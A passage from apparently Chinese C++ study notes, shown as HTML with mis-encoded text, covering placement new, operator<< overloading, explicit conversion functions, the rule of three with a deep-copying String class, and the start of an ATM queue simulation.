class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Not enough space for p2.\n&quot;</span>;</span><br><span class="line">         p2 = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Memory addresses:\n&quot;</span> &lt;&lt; <span class="string">&quot;buffer: &quot;</span> &lt;&lt; (<span class="keyword">void</span> *) buffer</span><br><span class="line">         &lt;&lt; <span class="string">&quot;  p1: &quot;</span> &lt;&lt; p1 &lt;&lt; <span class="string">&quot;  p2: &quot;</span> &lt;&lt; p2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1: &quot;</span> &lt;&lt; *p1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span> (p2) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2: &quot;</span> &lt;&lt; *p2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ˜¾å¼é”€æ¯å¯¹è±¡ (æŒ‰æ„é€ ç›¸åé¡ºåºé€šå¸¸æ˜¯å¥½ä¹ æƒ¯)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDestroying objects:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (p2) &#123;</span><br><span class="line">        p2-&gt;~String(); <span class="comment">// è°ƒç”¨ p2 æŒ‡å‘å¯¹è±¡çš„ææ„å‡½æ•°</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2 destroyed.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p1-&gt;~String();     <span class="comment">// è°ƒç”¨ p1 æŒ‡å‘å¯¹è±¡çš„ææ„å‡½æ•°</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1 destroyed.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// buffer å†…å­˜æœ¬èº«ä¼šåœ¨ main ç»“æŸæ—¶è‡ªåŠ¨é‡Šæ”¾ (å› ä¸ºå®ƒæ˜¯æ ˆä¸Šçš„æ•°ç»„)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nBlock 2: Standard new/delete:\n&quot;</span>;</span><br><span class="line">    String * p3 = <span class="keyword">new</span> String(<span class="string">&quot;Standard new&quot;</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p3: &quot;</span> &lt;&lt; *p3 &lt;&lt; <span class="string">&quot; at &quot;</span> &lt;&lt; p3 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">delete</span> p3; <span class="comment">// ä½¿ç”¨æ ‡å‡† deleteï¼Œå®ƒä¼šè°ƒç”¨ææ„å‡½æ•°å¹¶é‡Šæ”¾å†…å­˜</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p3 deleted.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“:</strong></p><ul><li>  æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆæ˜¯ç®¡ç†åŠ¨æ€åˆ›å»ºå¯¹è±¡çš„å¸¸ç”¨æ–¹å¼ã€‚</li><li>  <code>new ClassName(args)</code> åˆ†é…å†…å­˜å¹¶è°ƒç”¨æ„é€ å‡½æ•°ã€‚</li><li>  <code>delete ptr</code> è°ƒç”¨ææ„å‡½æ•°å¹¶é‡Šæ”¾å†…å­˜ã€‚</li><li>  <code>new ClassName[size]</code> åˆ†é…æ•°ç»„å¹¶è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°ã€‚</li><li>  <code>delete [] ptr</code> è°ƒç”¨æ•°ç»„å…ƒç´ çš„ææ„å‡½æ•°å¹¶é‡Šæ”¾å†…å­˜ã€‚</li><li>  ä½¿ç”¨ <code>-&gt;</code> è¿ç®—ç¬¦é€šè¿‡æŒ‡é’ˆè®¿é—®å¯¹è±¡æˆå‘˜ã€‚</li><li>  å®šä½ <code>new</code> (<code>new (address) ClassName(args)</code>) åœ¨æŒ‡å®šåœ°å€æ„é€ å¯¹è±¡ï¼Œä¸åˆ†é…å†…å­˜ã€‚</li><li>  å®šä½ <code>new</code> åˆ›å»ºçš„å¯¹è±¡å¿…é¡»é€šè¿‡æ˜¾å¼è°ƒç”¨ææ„å‡½æ•° (<code>ptr-&gt;~ClassName()</code>) æ¥é”€æ¯ï¼Œå†…å­˜éœ€å¦å¤–ç®¡ç†ã€‚</li></ul><h2 id="12-6-å¤ä¹ å„ç§æŠ€æœ¯"><a href="#12-6-å¤ä¹ å„ç§æŠ€æœ¯" class="headerlink" title="12.6 å¤ä¹ å„ç§æŠ€æœ¯"></a>12.6 å¤ä¹ å„ç§æŠ€æœ¯</h2><p>æœ¬ç« æˆ‘ä»¬æ·±å…¥æ¢è®¨äº†ç±»å¦‚ä½•ä¸åŠ¨æ€å†…å­˜åˆ†é…äº¤äº’ï¼Œä»¥åŠä¸ºäº†æ­£ç¡®ç®¡ç†èµ„æºå’Œé¿å…é”™è¯¯æ‰€å¿…é¡»é‡‡ç”¨çš„æŠ€æœ¯ã€‚æœ¬èŠ‚å°†ç®€è¦å›é¡¾å…¶ä¸­å‡ ä¸ªå…³é”®æŠ€æœ¯ç‚¹ã€‚</p><h3 id="12-6-1-é‡è½½-lt-lt-è¿ç®—ç¬¦"><a href="#12-6-1-é‡è½½-lt-lt-è¿ç®—ç¬¦" class="headerlink" title="12.6.1 é‡è½½ &lt;&lt; è¿ç®—ç¬¦"></a>12.6.1 é‡è½½ <code>&lt;&lt;</code> è¿ç®—ç¬¦</h3><p>ä¸ºäº†æ–¹ä¾¿åœ°è¾“å‡ºå¯¹è±¡çš„çŠ¶æ€ï¼Œæˆ‘ä»¬ç»å¸¸ä¸ºè‡ªå®šä¹‰ç±»é‡è½½è¾“å‡ºè¿ç®—ç¬¦ <code>&lt;&lt;</code>ã€‚</p><ul><li><strong>å®ç°æ–¹å¼:</strong> é€šå¸¸å®ç°ä¸º<strong>éæˆå‘˜å‹å…ƒå‡½æ•°</strong>ã€‚<ul><li>  <strong>éæˆå‘˜:</strong> å› ä¸ºå·¦æ“ä½œæ•°æ˜¯ <code>std::ostream</code> å¯¹è±¡ï¼ˆå¦‚ <code>cout</code>ï¼‰ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰ç±»çš„å¯¹è±¡ã€‚è°ƒç”¨å½¢å¼æ˜¯ <code>operator&lt;&lt;(cout, myObject)</code>ã€‚</li><li>  <strong>å‹å…ƒ:</strong> å› ä¸ºå®ƒé€šå¸¸éœ€è¦è®¿é—®ç±»çš„ <code>private</code> æ•°æ®æˆå‘˜æ¥è·å–è¦è¾“å‡ºçš„ä¿¡æ¯ã€‚</li></ul></li><li><strong>å‡½æ•°ç­¾å:</strong> <code>friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const ClassName &amp; obj);</code><ul><li>  ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <code>ostream</code> å¯¹è±¡çš„å¼•ç”¨ã€‚</li><li>  ç¬¬äºŒä¸ªå‚æ•°é€šå¸¸æ˜¯å¾…è¾“å‡ºå¯¹è±¡çš„ <code>const</code> å¼•ç”¨ï¼ˆå› ä¸ºè¾“å‡ºæ“ä½œä¸åº”ä¿®æ”¹å¯¹è±¡ï¼‰ã€‚</li><li>  è¿”å› <code>ostream</code> å¯¹è±¡çš„å¼•ç”¨ï¼Œä»¥æ”¯æŒé“¾å¼è¾“å‡ºï¼ˆ<code>cout &lt;&lt; obj1 &lt;&lt; obj2;</code>ï¼‰ã€‚</li></ul></li><li>  <strong>å®ç°:</strong> å‡½æ•°å†…éƒ¨è®¿é—®å¯¹è±¡çš„æˆå‘˜ï¼Œå¹¶å°†å®ƒä»¬æ ¼å¼åŒ–è¾“å‡ºåˆ°ä¼ å…¥çš„ <code>ostream</code> å¯¹è±¡ <code>os</code> ä¸­ã€‚</li></ul><p><strong>ç¤ºä¾‹ (å›é¡¾ <code>String</code> ç±»):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.h excerpt</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private: char * str; int len; ...</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> String &amp; st);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> String &amp; st) &#123;</span><br><span class="line">    os &lt;&lt; st.str; <span class="comment">// å‹å…ƒå‡½æ•°è®¿é—®ç§æœ‰æˆå‘˜ str</span></span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨</span></span><br><span class="line"><span class="function">String <span class="title">greeting</span><span class="params">(<span class="string">&quot;Hello&quot;</span>)</span></span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Message: &quot;</span> &lt;&lt; greeting &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è°ƒç”¨ operator&lt;&lt;(cout, greeting)</span></span><br></pre></td></tr></table></figure><h3 id="12-6-2-è½¬æ¢å‡½æ•°"><a href="#12-6-2-è½¬æ¢å‡½æ•°" class="headerlink" title="12.6.2 è½¬æ¢å‡½æ•°"></a>12.6.2 è½¬æ¢å‡½æ•°</h3><p>è½¬æ¢å‡½æ•°å…è®¸ç±»å¯¹è±¡è¢«éšå¼æˆ–æ˜¾å¼åœ°è½¬æ¢ä¸ºå…¶ä»–ç±»å‹ã€‚</p><ul><li><strong>è¯­æ³•:</strong> <code>operator typeName() const;</code><ul><li>  å¿…é¡»æ˜¯<strong>æˆå‘˜å‡½æ•°</strong>ã€‚</li><li>  <strong>æ²¡æœ‰</strong>å£°æ˜è¿”å›ç±»å‹ã€‚</li><li>  é€šå¸¸<strong>æ²¡æœ‰</strong>å‚æ•°ã€‚</li><li>  é€šå¸¸å£°æ˜ä¸º <code>const</code>ï¼Œå› ä¸ºè½¬æ¢æ“ä½œä¸åº”ä¿®æ”¹å¯¹è±¡çŠ¶æ€ã€‚</li></ul></li><li>  <strong>åŠŸèƒ½:</strong> å®šä¹‰äº†ä»å½“å‰ç±»ç±»å‹åˆ° <code>typeName</code> ç±»å‹çš„è½¬æ¢è§„åˆ™ã€‚</li><li>  <strong><code>explicit</code> (C++11):</strong> å¯ä»¥ä½¿ç”¨ <code>explicit</code> å…³é”®å­—é˜»æ­¢éšå¼è½¬æ¢ï¼Œåªå…è®¸æ˜¾å¼è½¬æ¢ï¼ˆå¦‚ <code>static_cast</code>ï¼‰ã€‚è¿™æœ‰åŠ©äºé¿å…æ„å¤–è½¬æ¢å’ŒäºŒä¹‰æ€§ã€‚</li></ul><p><strong>ç¤ºä¾‹ (å›é¡¾ <code>Stones</code> ç±»):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stones.h excerpt</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stones</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private: double pounds; ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// æ˜¾å¼è½¬æ¢ä¸º double</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span> <span class="keyword">const</span></span>;    <span class="comment">// æ˜¾å¼è½¬æ¢ä¸º int</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// stones.cpp excerpt</span></span><br><span class="line"><span class="function">Stones::<span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> pounds;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Stones::<span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>(pounds + <span class="number">0.5</span>); <span class="comment">// å››èˆäº”å…¥</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨</span></span><br><span class="line"><span class="function">Stones <span class="title">stone_obj</span><span class="params">(<span class="number">100.7</span>)</span></span>;</span><br><span class="line"><span class="comment">// double weight = stone_obj; // é”™è¯¯ï¼å› ä¸ºæ˜¯ explicit</span></span><br><span class="line"><span class="keyword">double</span> weight = <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(stone_obj); <span class="comment">// OK: æ˜¾å¼è½¬æ¢</span></span><br><span class="line"><span class="keyword">int</span> int_weight = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(stone_obj);    <span class="comment">// OK: æ˜¾å¼è½¬æ¢</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight: &quot;</span> &lt;&lt; weight &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  è°¨æ…ä½¿ç”¨éšå¼è½¬æ¢å‡½æ•°ï¼Œå®ƒä»¬å¯èƒ½å¯¼è‡´ä»£ç è¡Œä¸ºéš¾ä»¥é¢„æµ‹æˆ–äº§ç”ŸäºŒä¹‰æ€§ã€‚ä¼˜å…ˆä½¿ç”¨ <code>explicit</code>ã€‚</li><li>  é¿å…æä¾›ç›¸äº’å†²çªæˆ–æ¨¡ç³Šçš„è½¬æ¢è·¯å¾„ã€‚</li></ul><h3 id="12-6-3-å…¶æ„é€ å‡½æ•°ä½¿ç”¨-new-çš„ç±»"><a href="#12-6-3-å…¶æ„é€ å‡½æ•°ä½¿ç”¨-new-çš„ç±»" class="headerlink" title="12.6.3 å…¶æ„é€ å‡½æ•°ä½¿ç”¨ new çš„ç±»"></a>12.6.3 å…¶æ„é€ å‡½æ•°ä½¿ç”¨ <code>new</code> çš„ç±»</h3><p>è¿™æ˜¯æœ¬ç« çš„æ ¸å¿ƒå†…å®¹ã€‚å½“ç±»çš„æ„é€ å‡½æ•°ä½¿ç”¨ <code>new</code> æ¥åˆ†é…åŠ¨æ€å†…å­˜ï¼Œå¹¶ä¸”ç±»è´Ÿè´£ç®¡ç†è¿™å—å†…å­˜ï¼ˆå³åœ¨ææ„å‡½æ•°ä¸­ä½¿ç”¨ <code>delete</code>ï¼‰æ—¶ï¼Œå¿…é¡»ç‰¹åˆ«æ³¨æ„å¯¹è±¡çš„å¤åˆ¶å’Œèµ‹å€¼è¡Œä¸ºã€‚</p><p><strong>é—®é¢˜:</strong> ç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°å’Œé»˜è®¤èµ‹å€¼è¿ç®—ç¬¦æ‰§è¡Œ<strong>æµ…å¤åˆ¶</strong>ï¼ˆåªå¤åˆ¶æŒ‡é’ˆåœ°å€ï¼‰ï¼Œå¯¼è‡´ï¼š</p><ul><li>  å¤šä¸ªå¯¹è±¡æŒ‡å‘åŒä¸€å—å†…å­˜ã€‚</li><li>  ææ„æ—¶å‘ç”Ÿ**é‡å¤åˆ é™¤ (double deletion)**ã€‚</li><li>  èµ‹å€¼æ—¶å¯èƒ½å‘ç”Ÿ<strong>å†…å­˜æ³„æ¼</strong>ï¼ˆæ—§å†…å­˜æœªé‡Šæ”¾ï¼‰ã€‚</li></ul><p><strong>è§£å†³æ–¹æ¡ˆ (ä¸‰/äº”æ³•åˆ™):</strong><br>å¿…é¡»æä¾›è‡ªå®šä¹‰çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°æ¥æ‰§è¡Œ<strong>æ·±å¤åˆ¶</strong>å¹¶æ­£ç¡®ç®¡ç†å†…å­˜ï¼š</p><ol><li><p><strong>ææ„å‡½æ•° (<code>~ClassName()</code>):</strong></p><ul><li>  <strong>å¿…é¡»</strong>å®šä¹‰ã€‚</li><li>  è´Ÿè´£ä½¿ç”¨ <code>delete</code> æˆ– <code>delete[]</code> é‡Šæ”¾æ„é€ å‡½æ•°ä¸­é€šè¿‡ <code>new</code> åˆ†é…çš„æ‰€æœ‰å†…å­˜ã€‚</li></ul></li><li><p><strong>å¤åˆ¶æ„é€ å‡½æ•° (<code>ClassName(const ClassName &amp;)</code>):</strong></p><ul><li>  <strong>å¿…é¡»</strong>å®šä¹‰ã€‚</li><li>  ä¸ºæ–°å¯¹è±¡åˆ†é…<strong>è‡ªå·±çš„</strong>å†…å­˜ã€‚</li><li>  å°†æºå¯¹è±¡çš„æ•°æ®<strong>å¤åˆ¶</strong>åˆ°æ–°åˆ†é…çš„å†…å­˜ä¸­ã€‚</li></ul></li><li><p><strong>å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (<code>ClassName &amp; operator=(const ClassName &amp;)</code>):</strong></p><ul><li>  <strong>å¿…é¡»</strong>å®šä¹‰ã€‚</li><li>  <strong>æ£€æŸ¥è‡ªæˆ‘èµ‹å€¼</strong> (<code>if (this == &amp;other) return *this;</code>)ã€‚</li><li>  <strong>é‡Šæ”¾å½“å‰å¯¹è±¡ (<code>*this</code>) çš„æ—§å†…å­˜</strong>ã€‚</li><li>  ä¸ºå½“å‰å¯¹è±¡åˆ†é…<strong>æ–°çš„</strong>å†…å­˜ã€‚</li><li>  å°†æºå¯¹è±¡çš„æ•°æ®<strong>å¤åˆ¶</strong>åˆ°æ–°åˆ†é…çš„å†…å­˜ä¸­ã€‚</li><li>  è¿”å›å¯¹å½“å‰å¯¹è±¡ (<code>*this</code>) çš„å¼•ç”¨ã€‚</li></ul></li></ol><p><strong>ç¤ºä¾‹ (å›é¡¾ <code>String</code> ç±»å…³é”®éƒ¨åˆ†):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.h excerpt</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> * str;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    String(<span class="keyword">const</span> <span class="keyword">char</span> * s); <span class="comment">// Constructor using new</span></span><br><span class="line">    String(<span class="keyword">const</span> String &amp; st); <span class="comment">// Copy constructor (deep copy)</span></span><br><span class="line">    ~String(); <span class="comment">// Destructor using delete[]</span></span><br><span class="line">    String &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> String &amp; st); <span class="comment">// Assignment operator (deep copy)</span></span><br><span class="line">    String &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> <span class="keyword">char</span> * s);   <span class="comment">// Another assignment overload</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string1.cpp excerpt (å®ç°æ·±å¤åˆ¶)</span></span><br><span class="line">String::String(<span class="keyword">const</span> String &amp; st) &#123; <span class="comment">// Copy Constructor</span></span><br><span class="line">    len = st.len;</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span> [len + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, st.str);</span><br><span class="line">    <span class="comment">// ... (update static count etc.)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String::~String() &#123; <span class="comment">// Destructor</span></span><br><span class="line">    <span class="keyword">delete</span> [] str;</span><br><span class="line">    <span class="comment">// ... (update static count etc.)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String &amp; String::<span class="keyword">operator</span>=(<span class="keyword">const</span> String &amp; st) &#123; <span class="comment">// Assignment Operator</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;st)</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">delete</span> [] str; <span class="comment">// Free old string</span></span><br><span class="line">    len = st.len;</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span> [len + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, st.str);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç°ä»£ C++ (é›¶æ³•åˆ™):</strong><br>å¦‚æœå¯èƒ½ï¼Œå°½é‡é¿å…æ‰‹åŠ¨ç®¡ç†åŸå§‹æŒ‡é’ˆå’Œ <code>new</code>/<code>delete</code>ã€‚ä½¿ç”¨æ ‡å‡†åº“æä¾›çš„å®¹å™¨ï¼ˆå¦‚ <code>std::string</code>, <code>std::vector</code>ï¼‰å’Œæ™ºèƒ½æŒ‡é’ˆï¼ˆå¦‚ <code>std::unique_ptr</code>, <code>std::shared_ptr</code>ï¼‰ã€‚è¿™äº›ç±»å·²ç»å†…ç½®äº†æ­£ç¡®çš„èµ„æºç®¡ç†å’Œå¤åˆ¶/ç§»åŠ¨è¯­ä¹‰ï¼Œéµå¾ª RAII åŸåˆ™ã€‚å¦‚æœä½ çš„ç±»åªåŒ…å«è¿™ç±»æˆå‘˜ï¼Œé€šå¸¸å°±ä¸éœ€è¦ç¼–å†™è‡ªå®šä¹‰çš„ææ„å‡½æ•°ã€å¤åˆ¶/ç§»åŠ¨æ„é€ å‡½æ•°æˆ–èµ‹å€¼è¿ç®—ç¬¦ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬å°±èƒ½æ­£ç¡®å·¥ä½œï¼ˆé›¶æ³•åˆ™ï¼‰ã€‚</p><p>æŒæ¡è¿™äº›æŠ€æœ¯å¯¹äºç¼–å†™å®‰å…¨ã€å¥å£®ä¸”èƒ½æ­£ç¡®å¤„ç†åŠ¨æ€å†…å­˜çš„ C++ ç±»è‡³å…³é‡è¦ã€‚</p><h2 id="12-7-é˜Ÿåˆ—æ¨¡æ‹Ÿ"><a href="#12-7-é˜Ÿåˆ—æ¨¡æ‹Ÿ" class="headerlink" title="12.7 é˜Ÿåˆ—æ¨¡æ‹Ÿ"></a>12.7 é˜Ÿåˆ—æ¨¡æ‹Ÿ</h2><p>æœ¬ç« æˆ‘ä»¬å­¦ä¹ äº†ç±»å’ŒåŠ¨æ€å†…å­˜åˆ†é…ï¼Œç°åœ¨æˆ‘ä»¬å°†è¿™äº›çŸ¥è¯†åº”ç”¨äºä¸€ä¸ªå®é™…é—®é¢˜ï¼šæ¨¡æ‹Ÿé“¶è¡Œ ATM çš„å®¢æˆ·é˜Ÿåˆ—ã€‚é€šè¿‡æ¨¡æ‹Ÿï¼Œæˆ‘ä»¬å¯ä»¥åˆ†æä¸åŒæ¡ä»¶ä¸‹ï¼ˆå¦‚ä¸åŒçš„å®¢æˆ·åˆ°è¾¾ç‡ã€ä¸åŒçš„é˜Ÿåˆ—æœ€å¤§é•¿åº¦ï¼‰å®¢æˆ·çš„å¹³å‡ç­‰å¾…æ—¶é—´ï¼Œå¸®åŠ©é“¶è¡Œåšå‡ºå†³ç­–ã€‚</p><p><strong>æ¨¡æ‹Ÿåœºæ™¯:</strong></p><ul><li>  æœ‰ä¸€ä¸ª ATM æœºã€‚</li><li>  å®¢æˆ·éšæœºåˆ°è¾¾ï¼Œå¹³å‡æ¯å°æ—¶åˆ°è¾¾ä¸€å®šæ•°é‡çš„å®¢æˆ·ã€‚</li><li>  å®¢æˆ·åˆ°è¾¾åï¼Œå¦‚æœ ATM ç©ºé—²ä¸”é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™ç›´æ¥ä½¿ç”¨ ATMã€‚</li><li>  å¦‚æœ ATM ç¹å¿™æˆ–é˜Ÿåˆ—éç©ºï¼Œå®¢æˆ·è¿›å…¥é˜Ÿåˆ—ç­‰å¾…ã€‚</li><li>  é˜Ÿåˆ—æœ‰æœ€å¤§é•¿åº¦é™åˆ¶ï¼Œå¦‚æœå®¢æˆ·åˆ°è¾¾æ—¶é˜Ÿåˆ—å·²æ»¡ï¼Œåˆ™å®¢æˆ·ç¦»å¼€ï¼ˆè¢«æ‹’ç»æœåŠ¡ï¼‰ã€‚</li><li>  æ¯ä¸ªå®¢æˆ·çš„äº¤æ˜“æ—¶é—´æ˜¯éšæœºçš„ï¼ˆåœ¨æŸä¸ªèŒƒå›´å†…ï¼‰ã€‚</li><li>  æˆ‘ä»¬æƒ³æ¨¡æ‹Ÿä¸€æ®µæ—¶é—´ï¼ˆä¾‹å¦‚ 100 å°æ—¶ï¼‰ï¼Œç„¶åç»Ÿè®¡ï¼šæœåŠ¡çš„æ€»å®¢æˆ·æ•°ã€è¢«æ‹’ç»çš„æ€»å®¢æˆ·æ•°ã€å¹³å‡é˜Ÿåˆ—é•¿åº¦ã€å¹³å‡å®¢æˆ·ç­‰å¾…æ—¶é—´ã€‚</li></ul><p><strong>å®ç°æ€è·¯:</strong></p><p>ä¸ºäº†å®ç°è¿™ä¸ªæ¨¡æ‹Ÿï¼Œæˆ‘ä»¬éœ€è¦ä¸¤ä¸ªä¸»è¦çš„ç±»ï¼š</p><ol><li><strong><code>Customer</code> ç±»:</strong> ç”¨äºè¡¨ç¤ºä¸€ä¸ªå®¢æˆ·ã€‚å®ƒéœ€è¦å­˜å‚¨å®¢æˆ·çš„å…³é”®ä¿¡æ¯ï¼š<ul><li>  <strong>åˆ°è¾¾æ—¶é—´ (Arrival Time):</strong> å®¢æˆ·ä½•æ—¶åŠ å…¥é˜Ÿåˆ—ã€‚</li><li>  <strong>äº¤æ˜“æ‰€éœ€æ—¶é—´ (Processing Time):</strong> å®¢æˆ·åœ¨ ATM ä¸Šéœ€è¦èŠ±è´¹å¤šé•¿æ—¶é—´ã€‚</li></ul></li><li><strong><code>Queue</code> ç±»:</strong> ç”¨äºè¡¨ç¤ºç­‰å¾…é˜Ÿåˆ—ã€‚è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„<strong>å…ˆè¿›å…ˆå‡º (FIFO - First-In, First-Out)</strong> æ•°æ®ç»“æ„ã€‚æˆ‘ä»¬éœ€è¦èƒ½å¤Ÿï¼š<ul><li>  å°†å®¢æˆ·æ·»åŠ åˆ°é˜Ÿå°¾ (<code>enqueue</code>)ã€‚</li><li>  ä»é˜Ÿé¦–ç§»é™¤å®¢æˆ· (<code>dequeue</code>)ã€‚</li><li>  æ£€æŸ¥é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º (<code>is_empty</code>)ã€‚</li><li>  æ£€æŸ¥é˜Ÿåˆ—æ˜¯å¦å·²æ»¡ (<code>is_full</code>)ã€‚</li><li>  è·å–å½“å‰é˜Ÿåˆ—ä¸­çš„å®¢æˆ·æ•°é‡ 